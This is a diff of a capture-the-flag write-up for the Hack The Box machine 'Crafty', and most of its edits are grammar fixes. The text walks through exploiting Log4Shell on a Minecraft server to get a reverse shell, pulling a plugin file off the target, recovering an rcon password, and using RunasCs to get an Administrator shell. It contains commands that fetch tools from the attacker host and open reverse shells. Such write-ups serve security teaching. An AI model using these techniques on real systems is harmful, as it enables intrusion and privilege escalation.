@@ -1,17 +1,3 @@
----
-layout:
-  title:
-    visible: true
-  description:
-    visible: false
-  tableOfContents:
-    visible: true
-  outline:
-    visible: true
-  pagination:
-    visible: true
----
-
 # Crafty (Easy)
 
 ## <mark style="color:blue;">Description</mark>
@@ -50,7 +36,7 @@ nmap -p80,25565 -sVC -oN serv_scan.txt 10.129.230.193
 
 ***
 
-* I found an HTTP service on port 80 so I tried accessing the content on the browser. I got redirected to the _crafty.htb_ domain but couldn't get the content. So I added it to my list of known hosts in the _/etc/hosts_ file and visited again this time having access to a page about a server for the popular game [_Minecraft_](https://www.minecraft.net/)&#x20;
+* I found an HTTP service on port 80, so I tried accessing the content in the browser. I got redirected to the _crafty.htb_ domain, but couldn't get the content. So I added it to my list of known hosts in the _/etc/hosts_ file and visited again, this time having access to a page about a server for the popular game [_Minecraft_](https://www.minecraft.net/)&#x20;
 
 <figure><img src="../../.gitbook/assets/image (872).png" alt=""><figcaption></figcaption></figure>
 
@@ -63,12 +49,12 @@ echo "10.129.230.193 crafty.htb" >> /etc/hosts
 <figure><img src="../../.gitbook/assets/image (873).png" alt=""><figcaption></figcaption></figure>
 
 {% hint style="success" %}
-To learn more about the HTTP protocol you can go [here](../../networks/protocols/http.md)
+To learn more about the HTTP protocol, you can go [here](../../networks/protocols/http/)
 {% endhint %}
 
 ***
 
-* I explored all the site buttons but got redirected to a _Coming Soon_ page with no relevant info. The only interesting thing I found was a domain that with the context of the page should be for the _Minecraft_ server that was running on the machine, as also the previous scan showed me
+* I explored all the site buttons but got redirected to a _Coming Soon_ page with no relevant info. The only interesting thing I found was a domain that, with the context of the page, should be for the _Minecraft_ server that was running on the machine, as the previous scan also showed me
 
 <figure><img src="../../.gitbook/assets/image (875).png" alt=""><figcaption></figcaption></figure>
 
@@ -96,7 +82,7 @@ To learn more about the HTTP protocol you can go [here](../../networks/protocols
 
 ***
 
-* I downloaded it, checked its structure, and noticed something I had to modify. In line 26 of the script, it was spawning a _/bin/sh_ binary but changed it to _powershell.exe_ as our target was a _Windows_ machine. Then I set a listener with [_Netcat_](../../networks/tools-and-utilities.md#netcat) to catch the connection and reviewed the parameters needed, setting my IP to make the petition, an arbitrary port where the web server will be deployed, and the port where the listener was running
+* I downloaded it, checked its structure, and noticed something I had to modify. In line 26 of the script, it was spawning a _/bin/sh_ binary, but changed it to _powershell.exe_ as our target was a _Windows_ machine. Then I set a listener with [_Netcat_](../../networks/tools-and-utilities.md#netcat) to catch the connection and reviewed the parameters needed, setting my IP to make the petition, an arbitrary port where the web server will be deployed, and the port where the listener was running
 
 {% code overflow="wrap" lineNumbers="true" %}
 ```bash
@@ -110,12 +96,12 @@ python3 poc.py --userip 10.10.14.137 --webport 8080 --lport 4444
 <figure><img src="../../.gitbook/assets/image (55).png" alt=""><figcaption></figcaption></figure>
 
 {% hint style="success" %}
-To learn more about the _Log4Shell_ vulnerability and its exploitation you can go [here](../../web-exploitation/broken-access-control/cve-log4shell.md)
+To learn more about the _Log4Shell_ vulnerability and its exploitation, you can go [here](../../web-exploitation/broken-access-control/cve-log4shell.md)
 {% endhint %}
 
 ***
 
-* After executing it I got several errors related to _Java_. I didn't understand what was wrong, so I reviewed the repository again and noticed that for this script to work, I would need a proper [JDK version](https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html) in the repository. So I did that, with the JDK folder in the same place that the script was, I re-run it this time deploying everything without a problem
+* After executing it, I got several errors related to _Java_. I didn't understand what was wrong, so I reviewed the repository again and noticed that for this script to work, I would need a proper [JDK version](https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html) in the repository. So I did that, with the JDK folder in the same place that the script was, and re-run it this time, deploying everything without a problem
 
 <figure><img src="../../.gitbook/assets/image (888).png" alt=""><figcaption></figcaption></figure>
 
@@ -123,7 +109,7 @@ To learn more about the _Log4Shell_ vulnerability and its exploitation you can g
 
 ***
 
-* After that I inserted the payload for the _JNDI_ communication in the client and checked the script where I was notified about getting a request, confirming the petition was sent properly, and also checking the listener, I had caught a shell from the machine
+* After that, I inserted the payload for the _JNDI_ communication in the client and checked the script where I was notified about getting a request, confirming the petition was sent properly, and also checking the listener, I had caught a shell from the machine
 
 {% code overflow="wrap" lineNumbers="true" %}
 ```bash
@@ -138,7 +124,7 @@ To learn more about the _Log4Shell_ vulnerability and its exploitation you can g
 
 ***
 
-* Once inside I went to the Desktop of the user where I found a _user.txt_ file and reading its content I retrieved the user flag
+* Once inside, I went to the _Desktop_ of user where I found a _user.txt_ file, and reading its content, I retrieved the user flag
 
 <figure><img src="../../.gitbook/assets/image (885).png" alt=""><figcaption></figcaption></figure>
 
@@ -152,7 +138,7 @@ To learn more about the _Log4Shell_ vulnerability and its exploitation you can g
 
 ***
 
-* To find a way to escalate privileges I started looking at the files under the server's folder. There I found files related to logs and configurations, but what caught my attention was the _plugins_ folder, as they are usually added externally from the base software and are well-known for being vulnerable on various types of applications. Checking the content of this folder there was a _playercounter_ plugin that could be saving some interesting data about users
+* To find a way to escalate privileges, I started looking at the files under the server's folder. There I found files related to logs and configurations, but what caught my attention was the _plugins_ folder, as they are usually added externally from the base software and are well-known for being vulnerable on various types of applications. Checking the content of this folder, there was a _playercounter_ plugin that could be saving some interesting data about users
 
 <figure><img src="../../.gitbook/assets/image (892).png" alt=""><figcaption></figcaption></figure>
 
@@ -160,7 +146,7 @@ To learn more about the _Log4Shell_ vulnerability and its exploitation you can g
 
 ***
 
-* I checked the permissions we had on the folder but we didn't have writing permissions so we couldn't export or copy the content of the file. So I went to the root folder and created a Temp folder which will give me this advantage, then copied the file there and used [_certutil_](../../active-directory/tools-and-utilities-wip.md#certutil) to encode its content to base64 to prepare it for the transfer
+* I checked the permissions we had on the folder, but we didn't have writing permissions, so we couldn't export or copy the content of the file. So I went to the root folder and created a _Temp_ folder, which will give me this advantage, then copied the file there and used [_certutil_](../../active-directory/tools-and-utilities-wip.md#certutil) to encode its content to base64 to prepare it for the transfer
 
 {% code overflow="wrap" lineNumbers="true" %}
 ```powershell
@@ -181,11 +167,11 @@ type b64.txt
 
 ***
 
-* Having the encoded content, I copied it to a file on my machine and reverted the encoding process with the base64 command, saving its content again to a _.jar_ file to have again the same file. Then I searched on the web for a [Java Decompiler](https://jdec.app/) and uploaded the file being able to see the source code of the executable
+* Having the encoded content, I copied it to a file on my machine and reverted the encoding process with the base64 command, saving its content again to a _.jar_ file to have again the same file. Then I searched on the web for a [Java Decompiler](https://jdec.app/) and uploaded the file, being able to see the source code of the executable
 
 {% code overflow="wrap" lineNumbers="true" %}
 ```bash
-nano plugin.txt #Here we paste the b64 string
+nano plugin.txt #Here I pasted the b64 string
 cat plugin.txt | base64 -d > plugin.jar
 file plugin.jar
 ```
@@ -197,7 +183,7 @@ file plugin.jar
 
 ***
 
-* I understood that this plugin was connecting to a _rcon_ service and logging in locally using the _s67uB4zKqBIXw_ password and then doing the counting process. This leaked a possible password for a user under the system, maybe for the _Administrator_ user. So to try logging in or even better to run commands as another user, I could try using the [_RunasCs_](../../active-directory/tools-and-utilities-wip.md#runascs) utility. To do so, I downloaded the binary on my machine and exported it to the target
+* I understood that this plugin was connecting to a _rcon_ service and logging in locally using the _s67uB4zKqBIXw_ password and then doing the counting process. This leaked a possible password for a user under the system, maybe for the _Administrator_ user. So, to try logging in or, even better, to run commands as another user, I could try using the [_RunasCs_](../../active-directory/tools-and-utilities-wip.md#runascs) utility. To do so, I downloaded the binary on my machine and exported it to the target
 
 {% code overflow="wrap" lineNumbers="true" %}
 ```powershell
@@ -215,7 +201,7 @@ wget http://10.10.14.10:8000/RunasCs.exe -outFile RunasCs.exe
 
 ***
 
-* Then I set another [_Netcat_](../../networks/tools-and-utilities.md#netcat) listener and tried using the binary to generate a Reverse Shell spawning a PowerShell that would connect to my machine specifying the proper credentials. With that, I successfully gained a shell as the _Administrator_ user
+* Then I set another [_Netcat_](../../networks/tools-and-utilities.md#netcat) listener and tried using the binary to generate a Reverse Shell, spawning a PowerShell that would connect to my machine, specifying the proper credentials. With that, I successfully gained a shell as the _Administrator_ user
 
 {% code overflow="wrap" lineNumbers="true" %}
 ```bash
@@ -235,7 +221,7 @@ nc -nvlp 7777
 
 ***
 
-* Finally, I went to the Desktop folder where I found a _root.txt_ file, and reading its content I retrieved the root flag
+* Finally, I went to the Desktop folder where I found a _root.txt_ file, and reading its content, I retrieved the root flag
 
 <figure><img src="../../.gitbook/assets/image (33).png" alt=""><figcaption></figcaption></figure>
 
